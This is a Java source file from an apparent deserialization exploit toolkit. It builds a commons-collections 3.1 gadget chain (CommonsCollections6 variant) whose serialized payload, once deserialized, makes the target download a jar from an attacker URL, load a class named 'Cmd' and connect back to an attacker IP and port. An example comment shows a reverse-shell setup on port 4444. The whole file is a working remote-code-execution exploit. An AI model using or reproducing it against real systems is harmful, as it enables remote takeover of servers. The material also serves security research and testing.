package marshalsec.gadgets;

import java.io.Serializable;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;
import marshalsec.UtilFactory;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

/*
	Gadget chain:
	    java.io.ObjectInputStream.readObject()
            java.util.HashSet.readObject()
                java.util.HashMap.put()
                java.util.HashMap.hash()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
                        org.apache.commons.collections.map.LazyMap.get()
                            org.apache.commons.collections.functors.ChainedTransformer.transform()
                            org.apache.commons.collections.functors.InvokerTransformer.transform()
                            java.lang.reflect.Method.invoke()
                                java.lang.Runtime.exec()

    by @matthias_kaiser
*/
/**
 * commons-collections:commons-collections:3.1
 */
public interface CommonsCollections6ForLoadJar extends Gadget {

    default Serializable makeCommonsCollections6ForLoadJar(UtilFactory uf, String[] args) throws Exception {
        // http://127.0.0.1:8080/R.jar 127.0.0.1 4444
        String payloadUrl = args[0];

        String ip2 = args[1];
        Integer port2 = Integer.parseInt(args[2]);
        // real chain for after setup
        final Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(java.net.URLClassLoader.class),
            // getConstructor class.class classname
            new InvokerTransformer("getConstructor",
                new Class[] { Class[].class },
                new Object[] { new Class[] { java.net.URL[].class } }),
            new InvokerTransformer(
                "newInstance",
                new Class[] { Object[].class },
                new Object[] { new Object[] { new java.net.URL[] { new java.net.URL(
                    payloadUrl) } } }),
            // loadClass String.class R
            new InvokerTransformer("loadClass",
                new Class[] { String.class }, new Object[] { "Cmd" }),
            // set the target reverse ip and port
            new InvokerTransformer("getConstructor",
                new Class[] { Class[].class },
                new Object[] { new Class[] { String.class,int.class } }),
            // invoke
            new InvokerTransformer("newInstance",
                new Class[] { Object[].class },
                new Object[] { new Object[] { ip2,port2 } }),
            new ConstantTransformer(1) };
        final Map innerMap = new HashMap();
        // inert chain for setup
        Transformer transformerChain = new ChainedTransformer(transformers);
        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

        HashSet map = new HashSet(1);
        map.add("foo");
        Field f = null;
        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            f = HashSet.class.getDeclaredField("backingMap");
        }

        f.setAccessible(true);
        HashMap innimpl = (HashMap) f.get(map);

        Field f2 = null;
        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }


        f2.setAccessible(true);
        Object[] array = (Object[]) f2.get(innimpl);

        Object node = array[0];
        if(node == null){
            node = array[1];
        }

        Field keyField = null;
        try{
            keyField = node.getClass().getDeclaredField("key");
        }catch(Exception e){
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }

        keyField.setAccessible(true);
        keyField.set(node, entry);

        return map;

    }
}
